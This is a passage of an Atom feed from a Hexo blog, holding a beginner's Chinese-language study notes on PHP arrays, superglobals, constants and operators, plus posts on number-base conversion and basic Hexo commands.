对数组进行升序排列</p></li><li><p>rsort() - 对数组进行降序排列</p></li><li><p>asort() - 根据关联数组的值，对数组进行升序排列</p></li><li><p>ksort() - 根据关联数组的键，对数组进行升序排列</p></li><li><p>arsort() - 根据关联数组的值，对数组进行降序排列</p></li><li><p>krsort() - 根据关联数组的键，对数组进行降序排列</p><h5 id="sort-函数"><a href="#sort-函数" class="headerlink" title="sort()函数"></a>sort()函数</h5></li></ul><hr><p>作用</p><p>1将 数组中的元素按照字母升序排列</p><p>2将 数组中的元素按照数字升序排列</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;); </span><br><span class="line">sort($cars); </span><br><span class="line">print_r($cars);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>输出   Array (    [0] =&gt; BMW    [1] =&gt; Toyota    [2] =&gt; Volvo )</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$numbers&#x3D;array(4,6,2,22,11); </span><br><span class="line">sort($numbers); </span><br><span class="line">print_r($numbers); </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>输出   Array (    [0] =&gt; 2    [1] =&gt; 4    [2] =&gt; 6    [3] =&gt; 11    [4] =&gt; 22 )</p><h5 id="rsort"><a href="#rsort" class="headerlink" title="rsort()"></a>rsort()</h5><p>将 数组中的元素按照字母降序排列</p><p>将 数组中的元素按照数字降序排列</p><h5 id="asort"><a href="#asort" class="headerlink" title="asort()"></a>asort()</h5><hr><p>根据数组的值，对关联数组进行升序排列</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$age&#x3D;array(&quot;Peter&quot;&#x3D;&gt;&quot;35&quot;,&quot;Ben&quot;&#x3D;&gt;&quot;37&quot;,&quot;Joe&quot;&#x3D;&gt;&quot;43&quot;); </span><br><span class="line">asort($age); </span><br><span class="line">print_r($age); </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>输出Array (    [Peter] =&gt; 35    [Ben] =&gt; 37    [Joe] =&gt; 43 )</p><h4 id="超级全局变量"><a href="#超级全局变量" class="headerlink" title="超级全局变量"></a>超级全局变量</h4><h2 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h2><table><thead><tr><th>元素/代码</th><th>描述</th></tr></thead><tbody><tr><td>$_SERVER[‘PHP_SELF’]</td><td>当前执行脚本的文件名，与 document root 有关。例如，在地址为  <a href="http://example.com/test.php/foo.bar">http://example.com/test.php/foo.bar</a> 的脚本中使用 $<em>SERVER[‘PHP_SELF’] 将得到  /test.php/foo.bar。__FILE_</em> 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果  PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。</td></tr><tr><td>$_SERVER[‘GATEWAY_INTERFACE’]</td><td>服务器使用的 CGI 规范的版本；例如，”CGI/1.1”。</td></tr><tr><td>$_SERVER[‘SERVER_ADDR’]</td><td>当前运行脚本所在的服务器的 IP 地址。</td></tr><tr><td>$_SERVER[‘SERVER_NAME’]</td><td>当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。(如: <a href="http://www.runoob.com/">www.runoob.com</a>)</td></tr><tr><td>$_SERVER[‘SERVER_SOFTWARE’]</td><td>服务器标识字符串，在响应请求时的头信息中给出。 (如：Apache/2.2.24)</td></tr><tr><td>$_SERVER[‘SERVER_PROTOCOL’]</td><td>请求页面时通信协议的名称和版本。例如，”HTTP/1.0”。</td></tr><tr><td>$_SERVER[‘REQUEST_METHOD’]</td><td>访问页面使用的请求方法；例如，”GET”, “HEAD”，”POST”，”PUT”。</td></tr><tr><td>$_SERVER[‘REQUEST_TIME’]</td><td>请求开始时的时间戳。从 PHP 5.1.0 起可用。 (如：1377687496)</td></tr><tr><td>$_SERVER[‘QUERY_STRING’]</td><td>query string（查询字符串），如果有的话，通过它进行页面访问。</td></tr><tr><td>$_SERVER[‘HTTP_ACCEPT’]</td><td>当前请求头中 Accept: 项的内容，如果存在的话。</td></tr><tr><td>$_SERVER[‘HTTP_ACCEPT_CHARSET’]</td><td>当前请求头中 Accept-Charset: 项的内容，如果存在的话。例如：”iso-8859-1,*,utf-8”。</td></tr><tr><td>$_SERVER[‘HTTP_HOST’]</td><td>当前请求头中 Host: 项的内容，如果存在的话。</td></tr><tr><td>$_SERVER[‘HTTP_REFERER’]</td><td>引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。)</td></tr><tr><td>$_SERVER[‘HTTPS’]</td><td>如果脚本是通过 HTTPS 协议被访问，则被设为一个非空的值。</td></tr><tr><td>$_SERVER[‘REMOTE_ADDR’]</td><td>浏览当前页面的用户的 IP 地址。</td></tr><tr><td>$_SERVER[‘REMOTE_HOST’]</td><td>浏览当前页面的用户的主机名。DNS 反向解析不依赖于用户的 REMOTE_ADDR。</td></tr><tr><td>$_SERVER[‘REMOTE_PORT’]</td><td>用户机器上连接到 Web 服务器所使用的端口号。</td></tr><tr><td>$_SERVER[‘SCRIPT_FILENAME’]</td><td>当前执行脚本的绝对路径。</td></tr><tr><td>$_SERVER[‘SERVER_ADMIN’]</td><td>该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。(如：<a href="mailto:&#x73;&#111;&#x6d;&#101;&#x6f;&#x6e;&#101;&#64;&#x72;&#x75;&#x6e;&#x6f;&#111;&#x62;&#46;&#99;&#x6f;&#109;">&#x73;&#111;&#x6d;&#101;&#x6f;&#x6e;&#101;&#64;&#x72;&#x75;&#x6e;&#x6f;&#111;&#x62;&#46;&#99;&#x6f;&#109;</a>)</td></tr><tr><td>$_SERVER[‘SERVER_PORT’]</td><td>Web 服务器使用的端口。默认值为 “80”。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。</td></tr><tr><td>$_SERVER[‘SERVER_SIGNATURE’]</td><td>包含了服务器版本和虚拟主机名的字符串。</td></tr><tr><td>$_SERVER[‘PATH_TRANSLATED’]</td><td>当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。</td></tr><tr><td>$_SERVER[‘SCRIPT_NAME’]</td><td>包含当前脚本的路径。这在页面需要指向自己时非常有用。<strong>FILE</strong> 常量包含当前脚本(例如包含文件)的完整路径和文件名。</td></tr><tr><td>$_SERVER[‘SCRIPT_URI’]</td><td>URI 用来指定要访问的页面。例如 “/index.html”。</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;条件语句&quot;&gt;&lt;a href=&quot;#条件语句&quot; class=&quot;headerlink&quot; title=&quot;条件语句&quot;&gt;&lt;/a&gt;条件语句&lt;/h4&gt;&lt;p&gt;由于if，，else；elseif的用法与Python很像，就简单举个例子加强记忆。&lt;/p&gt;
&lt;figure class=&quot;</summary>
      
    
    
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP语法学习2</title>
    <link href="http://example.com/2020/10/11/PHP%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A02/"/>
    <id>http://example.com/2020/10/11/PHP%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A02/</id>
    <published>2020-10-10T18:49:34.000Z</published>
    <updated>2020-10-10T12:40:32.638Z</updated>
    
    <content type="html"><![CDATA[<h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><h5 id="使用函数"><a href="#使用函数" class="headerlink" title="使用函数"></a>使用函数</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define() </span><br></pre></td></tr></table></figure><p>用法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&quot;A&quot; ,&quot;B&quot;);  &#x2F;&#x2F;设置常量为A，令常量A&#x3D;B.</span><br><span class="line"> </span><br><span class="line">function myTest()</span><br><span class="line">&#123;</span><br><span class="line">    echo A;  &#x2F;&#x2F;输出常量A，，，echo A不可换为echo &quot;A&quot;,否则会输出字符串。</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">myTest();    </span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>[^注意！！！]: 这种方法是会区分大小写的，也就是说，如果输出命令为echo a ,就会提示“<code>Warning: Use of undefined constant greeting - assumed &#39;a&#39; (this will throw an Error in a future version of PHP) in /box/script.php on line a </code>”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(&quot;A&quot; ,&quot;B&quot; ,true);  </span><br></pre></td></tr></table></figure><h5 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h5><table><thead><tr><th>1</th><th>name</th><th>必选参数，常量名称，即标志符。</th></tr></thead><tbody><tr><td>2</td><td>value</td><td>必选参数，常量的值。</td></tr><tr><td>3</td><td>case-insensitive</td><td>可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。</td></tr></tbody></table><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h5 id="字符串变量"><a href="#字符串变量" class="headerlink" title="字符串变量"></a>字符串变量</h5><table><thead><tr><th>序号</th><th>函数/运算符</th><th>作用</th></tr></thead><tbody><tr><td>1</td><td>（, )////( . )</td><td>将两个及以上的字符串连起来。</td></tr><tr><td>2</td><td>strlen( )</td><td>计算字符串的长度值。</td></tr><tr><td>3</td><td>strpos( )</td><td>查找字符串中某个片段的位置。</td></tr></tbody></table><h5 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h5><h6 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h6><table><thead><tr><th>运算符</th><th>作用</th></tr></thead><tbody><tr><td>x+y</td><td>加</td></tr><tr><td>x-y</td><td>减</td></tr><tr><td>x*y</td><td>乘</td></tr><tr><td>x/y</td><td>除</td></tr><tr><td>x%y</td><td>求余</td></tr><tr><td>-x</td><td>求相反数</td></tr><tr><td>x.y</td><td>连接两个字符串</td></tr></tbody></table><p>for example</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$x&#x3D;10;</span><br><span class="line">$y&#x3D;3;</span><br><span class="line">echo ($x + $y);&#x2F;&#x2F;需要执行的需要用echo （），用echo &quot;&quot;会输出字符串。</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo($x - $y);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo ($x * $y);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo ($x &#x2F; $y);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">echo ($x % $y);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h6><table><thead><tr><th>运算符</th><th>作用</th></tr></thead><tbody><tr><td>x=y</td><td>x=y</td></tr><tr><td>x+=y</td><td>x=x+y</td></tr><tr><td>x-=y</td><td>x=x-y</td></tr><tr><td>x*=y</td><td>x=x*y</td></tr><tr><td>x/=y</td><td>x=x/y</td></tr><tr><td>x%=y</td><td>x=x%y</td></tr><tr><td>x.=y</td><td>x=x.y</td></tr></tbody></table><h6 id="递增、递减运算符"><a href="#递增、递减运算符" class="headerlink" title="递增、递减运算符"></a>递增、递减运算符</h6><table><thead><tr><th>运算符</th><th>作用</th><th>代码</th><th>输出</th></tr></thead><tbody><tr><td>++x</td><td>预递增     x 加 1，然后返回 x</td><td>echo ++$x</td><td>x+1  (x值已改变)</td></tr><tr><td>x++</td><td>后递增     返回 x，然后 x 加 1</td><td>echo $x++</td><td>x  (x值已改变)</td></tr><tr><td>–x</td><td>预递减     x 减 1，然后返回 x</td><td>echo –$x</td><td>x-1  (x值已改变)</td></tr><tr><td>x–</td><td>后递减     返回 x，然后 x 减 1</td><td>echo $x–</td><td>x  (x值已改变)</td></tr></tbody></table><h6 id="比较运算符（bool）"><a href="#比较运算符（bool）" class="headerlink" title="比较运算符（bool）"></a>比较运算符（bool）</h6><table><thead><tr><th>运算符</th><th>名称</th><th>判断方式</th></tr></thead><tbody><tr><td>==</td><td>等于</td><td>字符相同</td></tr><tr><td>===</td><td>绝对等于</td><td>字符相同，类型相同</td></tr><tr><td>！=</td><td>不等于</td><td>字符不相同</td></tr><tr><td>&lt;&gt;</td><td>不等于</td><td>字符不相同</td></tr><tr><td>!==</td><td>绝对不等于</td><td>字符不相同/类型不相同</td></tr><tr><td>&gt;</td><td>大于</td><td></td></tr><tr><td>&lt;</td><td>小于</td><td></td></tr><tr><td>&gt;=</td><td>大于等于</td><td></td></tr><tr><td>&lt;=</td><td>小于等于</td><td></td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;常量&quot;&gt;&lt;a href=&quot;#常量&quot; class=&quot;headerlink&quot; title=&quot;常量&quot;&gt;&lt;/a&gt;常量&lt;/h3&gt;&lt;h5 id=&quot;使用函数&quot;&gt;&lt;a href=&quot;#使用函数&quot; class=&quot;headerlink&quot; title=&quot;使用函数&quot;&gt;&lt;/a&gt;使用函数&lt;/h</summary>
      
    
    
    
    
    <category term="PHP学习 小白总结" scheme="http://example.com/tags/PHP%E5%AD%A6%E4%B9%A0-%E5%B0%8F%E7%99%BD%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>PHP语法学习1</title>
    <link href="http://example.com/2020/10/10/PHP%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2020/10/10/PHP%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-10-09T19:44:54.000Z</published>
    <updated>2020-10-09T13:23:57.294Z</updated>
    
    <content type="html"><![CDATA[<p>[^]: </p><p>该文为对所收集的资料的一些归纳总结，文末处将放出引用文章链接。</p><h2 id="基本的-PHP-语法"><a href="#基本的-PHP-语法" class="headerlink" title="基本的 PHP 语法"></a>基本的 PHP 语法</h2><p>[^放在代码最前面和最后面]: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; PHP 代码</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>变量设置的字母前面都要加“$”号</p><p>eg：$x=8</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function myTest()</span><br><span class="line">&#123;</span><br><span class="line">    global $&#x2F;&#x2F;设置的变量</span><br><span class="line">    &#x2F;&#x2F;运算内容</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">myTest(); </span><br></pre></td></tr></table></figure><p>还有一种比较复杂的，但似乎效果没多大区别、</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">function myTest()</span><br><span class="line">&#123;</span><br><span class="line">    $GLOBALS[&#39;y&#39;]&#x3D;$GLOBALS[&#39;x&#39;]+$GLOBALS[&#39;y&#39;];</span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">myTest();</span><br><span class="line">echo $y;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><table><thead><tr><th>序号</th><th>作用域</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>global</td><td>全局作用域</td></tr><tr><td>2</td><td>local</td><td>局部作用域</td></tr><tr><td>3</td><td>static</td><td>静态作用域</td></tr><tr><td>4</td><td>parameter</td><td>函数参数作用域</td></tr></tbody></table><p>[^其实还不是很搞清楚这四个的区别，但感觉还是global更广]: </p><h4 id="输出语句"><a href="#输出语句" class="headerlink" title="输出语句"></a>输出语句</h4><p>[^主要是echo与print]: </p><p>​    echo - 可以输出一个或多个字符串</p><p>​    print - 只允许输出一个字符串，返回值总为 1</p><table><thead><tr><th>序号</th><th>种类</th><th>用途</th></tr></thead><tbody><tr><td>1</td><td>echo</td><td>输出一个或者多个字符串。</td></tr><tr><td>2</td><td>print</td><td>和 echo 最主要的区别： print 仅支持一个参数，并总是返回 1。</td></tr><tr><td>3</td><td>print-r</td><td>打印关于变量的易于理解的信息,如果给出的是 string、integer 或 float，将打印变量值本身。如果给出的是  array，将会按照一定格式显示键和元素。object 与数组类似。 记住，print_r() 将把数组的指针移到最后边。使用 reset()  可让指针回到开始处。</td></tr><tr><td>4</td><td>var-dump</td><td>此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</td></tr><tr><td></td><td></td><td></td></tr></tbody></table><p>顺便发现了‘br’和‘\n’的区别</p><table><thead><tr><th>代码</th><th>用途</th><th>区别</th></tr></thead><tbody><tr><td>br</td><td>换行</td><td>需打出<br>才可换行，否则无效。</td></tr><tr><td>\n</td><td>换行</td><td>打出”\n“即可换行</td></tr></tbody></table><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><table><thead><tr><th>序号</th><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>整型</td><td>整数</td></tr><tr><td>2</td><td>浮点型</td><td>小数或指数形式</td></tr><tr><td>3</td><td>数组</td><td>一种把values映射到keys的有序图</td></tr><tr><td>4</td><td>布尔型</td><td>用于条件判断</td></tr><tr><td>5</td><td>对象</td><td></td></tr><tr><td>6</td><td>字符串</td><td>一串字符的序列</td></tr><tr><td>7</td><td>NULL值</td><td>表示变量没有值</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[^]: &lt;/p&gt;
&lt;p&gt;该文为对所收集的资料的一些归纳总结，文末处将放出引用文章链接。&lt;/p&gt;
&lt;h2 id=&quot;基本的-PHP-语法&quot;&gt;&lt;a href=&quot;#基本的-PHP-语法&quot; class=&quot;headerlink&quot; title=&quot;基本的 PHP 语法&quot;&gt;&lt;/a&gt;基本的 </summary>
      
    
    
    
    
    <category term="php 学习笔记​" scheme="http://example.com/tags/php-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%8B/"/>
    
  </entry>
  
  <entry>
    <title>A Specil Article</title>
    <link href="http://example.com/2020/10/07/A-Specil-Article/"/>
    <id>http://example.com/2020/10/07/A-Specil-Article/</id>
    <published>2020-10-06T19:42:33.000Z</published>
    <updated>2020-10-06T12:11:50.837Z</updated>
    
    <content type="html"><![CDATA[<p>虽然说很多人已经在中学学习过了，但由于时间间隔太长，已经遗忘了大部分，就做一次归纳总结吧</p><h1 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h1><p>[二进制_百度百科]: </p><p>二进制（binary）在<a href="https://baike.baidu.com/item/%E6%95%B0%E5%AD%A6/107037">数学</a>和<a href="https://baike.baidu.com/item/%E6%95%B0%E5%AD%97%E7%94%B5%E8%B7%AF/1705">数字电路</a>中指以2为基数的记数系统，以2为基数代表系统是二进位制的。这一系统中，通常用两个不同的符号0（代表零）和1（代表一）来表示。</p><h4 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h4><ol><li><p>将值除以2，记下余数。</p></li><li><p>只要所得的商不为0，继续将最新的商除以2，并记下余数。</p></li><li><p>商为0时，将余数按照记录的顺序从下往上依次排列，即可得到该数的二进制。</p><h6 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h6></li></ol><p><img src="C:\Users\Administrator\Pictures\d01373f082025aaf317d0612f5edab64024f1a9f.png" alt="d01373f082025aaf317d0612f5edab64024f1a9f" loading="lazy"></p><h1 id="八进制"><a href="#八进制" class="headerlink" title="八进制"></a>八进制</h1><p>[八进制_百度百科]: </p><p>八进制，Octal，缩写OCT或O，一种以8为基数的<a href="https://baike.baidu.com/item/%E8%AE%A1%E6%95%B0%E6%B3%95/1591430">计数法</a>，采用0，1，2，3，4，5，6，7八个数字，逢八进1。一些编程语言中常常以数字0开始表明该数字是八进制。八进制的数和二进制数可以按位对应（八进制一位对应二进制三位），因此常应用在<a href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA">计算机</a>语言中。</p><h4 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h4><p>与二进制相似</p><p>十进制化八进制：采用除8取余法。</p><ol><li><p>将值除以8，记下余数。</p></li><li><p>只要所得的商不为0，继续将最新的商除以8，并记下余数。</p></li><li><p>商为0时，将余数按照记录的顺序从下往上依次排列，即可得到该数的二进制。</p><h6 id="举个栗子-1"><a href="#举个栗子-1" class="headerlink" title="举个栗子"></a>举个栗子</h6><p><img src="C:\Users\Administrator\Pictures\2345截图20201006200948.png" alt="2345截图20201006200948" loading="lazy"></p><h2 id="常用转换表"><a href="#常用转换表" class="headerlink" title="常用转换表"></a>常用转换表</h2><p><img src="C:\Users\Administrator\Pictures\u=2342573782,1111918725&fm=26&gp=0.jpg" alt="u=2342573782,1111918725&amp;fm=26&amp;gp=0" loading="lazy"></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;虽然说很多人已经在中学学习过了，但由于时间间隔太长，已经遗忘了大部分，就做一次归纳总结吧&lt;/p&gt;
&lt;h1 id=&quot;二进制&quot;&gt;&lt;a href=&quot;#二进制&quot; class=&quot;headerlink&quot; title=&quot;二进制&quot;&gt;&lt;/a&gt;二进制&lt;/h1&gt;&lt;p&gt;[二进制_百度百科]: &lt;/</summary>
      
    
    
    
    
    <category term="h-p-b-d a-gift 二进制/十进制/八进制" scheme="http://example.com/tags/h-p-b-d-a-gift-%E4%BA%8C%E8%BF%9B%E5%88%B6-%E5%8D%81%E8%BF%9B%E5%88%B6-%E5%85%AB%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>MyFirstArticle</title>
    <link href="http://example.com/2020/10/06/MyFirstArticle/"/>
    <id>http://example.com/2020/10/06/MyFirstArticle/</id>
    <published>2020-10-05T20:50:02.000Z</published>
    <updated>2020-10-05T14:03:21.822Z</updated>
    
    <content type="html"><![CDATA[<p>这几天花了好长(?)时间用hexo搭了一篇博客。。。<br>以下总结为几点：<br>首先，是<strong>hexo的基本命令</strong>：<br>1  <strong>hexo clean</strong>  （个人理解为清除缓存功能）<br>2  <strong>hexo g</strong>       (emmmmmm，应该是用于运行自己写下命令吧)<br>3  <strong>hexo s</strong>       （一般用于hexo g后面，大概是浏览效果吧）<br>4  <strong>hexo d</strong>       (将设计好的本地页面部署到Git上)</p><p>然后，最近发现了一些组合命令</p><p><strong>hexo g -d</strong></p><p>优点：比较快速，不用等待运行时间，一步到位，方便简洁</p><p>缺点：无法浏览，要是命令出现bug（尤其是搭建主题时），整个博客会直接崩掉。。。</p><p>​           然后事情就麻烦了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这几天花了好长(?)时间用hexo搭了一篇博客。。。&lt;br&gt;以下总结为几点：&lt;br&gt;首先，是&lt;strong&gt;hexo的基本命令&lt;/strong&gt;：&lt;br&gt;1  &lt;strong&gt;hexo clean&lt;/strong&gt;  （个人理解为清除缓存功能）&lt;br&gt;2  &lt;strong&gt;</summary>
      
    
    
    
    
    <category term="hexo blog" scheme="http://example.com/tags/hexo-blog/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2020/10/02/hello-world/"/>
    <id>http://example.com/2020/10/02/hello-world/</id>
    <published>2020-10-02T09:32:57.775Z</published>
    <updated>2020-10-02T09:32:57.775Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
